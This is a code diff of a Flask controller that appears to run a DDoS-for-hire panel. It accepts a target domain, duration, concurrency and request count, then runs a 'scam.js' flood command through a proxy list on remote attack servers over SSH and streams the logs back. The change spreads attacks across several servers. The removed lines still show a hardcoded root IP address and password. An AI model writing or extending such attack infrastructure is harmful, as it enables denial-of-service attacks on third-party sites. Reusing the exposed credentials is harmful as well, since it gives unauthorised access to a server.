@@ -8,29 +8,49 @@ import json
 from app.configs.blacklist import BLACKLISTED_DOMAINS, MAX_ATTACK_ATTEMPTS
 from app.models.user import User
 from app.configs.whitelist import WHITELISTED_IPS
+from app.configs.servers import ATTACK_SERVERS
+from app.models.attack_server_log import AttackServerLog
 
 class AttackController:
-    def _streamOutput(self, channel, socketId, attackLogId, app):
+    def _streamOutput(self, channel, socketId, attackLogId, serverHostname, app):
         with app.app_context():
             fullOutput = ""
+            serverLog = AttackServerLog(
+                attackLogId=attackLogId,
+                serverHostname=serverHostname,
+                status='running'
+            )
+            db.session.add(serverLog)
+            db.session.commit()
+
             while True:
                 if channel.recv_ready():
                     output = channel.recv(4096).decode()
                     fullOutput += output
-                    socketio.emit('log_message', {'data': output}, room=socketId)
+                    socketio.emit('log_message', {
+                        'data': output,
+                        'server': serverHostname
+                    }, room=socketId)
                 if channel.recv_stderr_ready():
                     errorOutput = channel.recv_stderr(4096).decode()
                     fullOutput += f"ERROR: {errorOutput}"
-                    socketio.emit('log_message', {'data': f"ERROR: {errorOutput}"}, room=socketId)
+                    socketio.emit('log_message', {
+                        'data': f"ERROR: {errorOutput}",
+                        'server': serverHostname
+                    }, room=socketId)
                 if channel.exit_status_ready():
-                    # Update attack log with final output
-                    attackLog = db.session.query(AttackLog).filter_by(id=attackLogId).first()
+                    # Update server log with final output
+                    serverLog.output = fullOutput
+                    serverLog.status = 'completed'
+                    db.session.commit()
 
-                    print("Attack completed")
-                    if attackLog:
-                        attackLog.output = fullOutput
-                        attackLog.status = 'completed'
-                        db.session.commit()
+                    # Check if all server logs are completed
+                    allServerLogs = AttackServerLog.query.filter_by(attackLogId=attackLogId).all()
+                    if all(log.status == 'completed' for log in allServerLogs):
+                        attackLog = AttackLog.query.get(attackLogId)
+                        if attackLog:
+                            attackLog.status = 'completed'
+                            db.session.commit()
                     break
 
     def _executeRemoteCommand(self, hostName, userName, passWord, command, socketId, attackLogId):
@@ -44,29 +64,58 @@ class AttackController:
             channel.get_pty()
             channel.exec_command(command)
 
-            app = current_app._get_current_object()  # Get the actual app instance
+            app = current_app._get_current_object()
             streamThread = threading.Thread(
                 target=self._streamOutput, 
-                args=(channel, socketId, attackLogId, app)
+                args=(channel, socketId, attackLogId, hostName, app)
             )
             streamThread.daemon = True
             streamThread.start()
             
             return True, None
         except Exception as e:
-            # Update attack log status on error
-            attackLog = AttackLog.query.get(attackLogId)
-            if attackLog:
-                attackLog.status = 'failed'
-                attackLog.output = str(e)
-                db.session.commit()
+            # Update server log status on error
+            serverLog = AttackServerLog(
+                attackLogId=attackLogId,
+                serverHostname=hostName,
+                status='failed',
+                output=str(e)
+            )
+            db.session.add(serverLog)
+            db.session.commit()
             return False, str(e)
+
+    def _executeOnServers(self, attackCommand, socketId, attackLogId, serverList=None):
+        if not serverList:
+            serverList = ATTACK_SERVERS
+
+        successfulServers = []
+        errors = []
+
+        for server in serverList:
+            # Generate command using server-specific node path
+            command = f"xvfb-run {server['nodePath']} {attackCommand}"
+            
+            success, error = self._executeRemoteCommand(
+                server['hostName'],
+                server['userName'],
+                server['password'],
+                command,
+                socketId,
+                attackLogId
+            )
+            
+            if success:
+                successfulServers.append(server['hostName'])
+            else:
+                errors.append(f"Server {server['hostName']}: {error}")
+
+        return successfulServers, errors
 
     def attack(self):
         # Check if client IP is whitelisted
-        client_ip = request.remote_addr
-        print(client_ip)
-        if client_ip not in WHITELISTED_IPS:
+        clientIp = request.remote_addr
+        if clientIp not in WHITELISTED_IPS:
             return jsonify({
                 "status": "error",
                 "message": "Access denied: Your IP is not whitelisted"
@@ -128,8 +177,24 @@ class AttackController:
                 "message": "Domain is required"
             }), 400
 
-        command = f"xvfb-run /root/.nvm/versions/node/v20.18.1/bin/node scam.js {domainName} {timeValue} {concurrentValue} {requestCount} proxy.txt --debug true --auth true"
+        # Get target servers from request
+        data = request.get_json()
+        targetServers = data.get('servers', None)
+        
+        # Filter servers if specific ones are requested
+        selectedServers = None
+        if targetServers:
+            selectedServers = [
+                server for server in ATTACK_SERVERS 
+                if server['hostName'] in targetServers
+            ]
+            if not selectedServers:
+                return jsonify({
+                    "status": "error",
+                    "message": "No valid servers found in the request"
+                }), 400
 
+        attackCommand = f"scam.js {domainName} {timeValue} {concurrentValue} {requestCount} proxy.txt --debug true --auth true"
         # Create attack log entry
         attackLog = AttackLog(
             userId=currentUser['id'],
@@ -137,28 +202,32 @@ class AttackController:
             time=int(timeValue),
             concurrent=int(concurrentValue),
             request=int(requestCount),
-            command=command,
+            command=attackCommand,
             headers=json.dumps(headers) if headers else None
         )
         db.session.add(attackLog)
         db.session.commit()
 
-        hostName = "199.204.99.242"
-        userName = "root" 
-        passWord = "42f1cb88E05w"
-        
-        success, error = self._executeRemoteCommand(hostName, userName, passWord, command, socketId, attackLog.id)
-        
-        if not success:
+        # Execute command on all specified servers with parameters instead of command
+        successfulServers, errors = self._executeOnServers(
+            attackCommand,
+            socketId,
+            attackLog.id,
+            selectedServers
+        )
+
+        if not successfulServers:
             return jsonify({
                 "status": "error",
-                "message": error
+                "message": f"Attack failed on all servers. Errors: {', '.join(errors)}"
             }), 500
-            
+
         return jsonify({
             "status": "success",
             "message": "Attack started. Check websocket for live logs.",
-            "attackLogId": attackLog.id
+            "attackLogId": attackLog.id,
+            "successfulServers": successfulServers,
+            "errors": errors if errors else None
         })
 
     def getLogs(self):
@@ -167,12 +236,21 @@ class AttackController:
         page = int(request.args.get('page', 1))
         skip = (page - 1) * limit
 
+        # Modified query to include server logs
         query = AttackLog.query.filter_by(userId=currentUser['id'])
         logs = query.order_by(AttackLog.createdAt.desc()).limit(limit).offset(skip).all()
         total = query.count()
 
+        # Fetch server logs for each attack log
+        logsWithServerData = []
+        for log in logs:
+            logDict = log.toDict()
+            serverLogs = AttackServerLog.query.filter_by(attackLogId=log.id).all()
+            logDict['serverLogs'] = [serverLog.toDict() for serverLog in serverLogs]
+            logsWithServerData.append(logDict)
+
         return jsonify({
-            'logs': [log.toDict() for log in logs],
+            'data': logsWithServerData,
             'meta': {
                 'total': total,
                 'totalPages': -(-total // limit),
@@ -191,7 +269,12 @@ class AttackController:
                 "message": "Log not found"
             }), 404
 
+        # Include server logs in the response
+        serverLogs = AttackServerLog.query.filter_by(attackLogId=logId).all()
+        logDict = log.toDict()
+        logDict['serverLogs'] = [serverLog.toDict() for serverLog in serverLogs]
+
         return jsonify({
             "status": "success",
-            "data": log.toDict()
+            "data": logDict
         }), 200
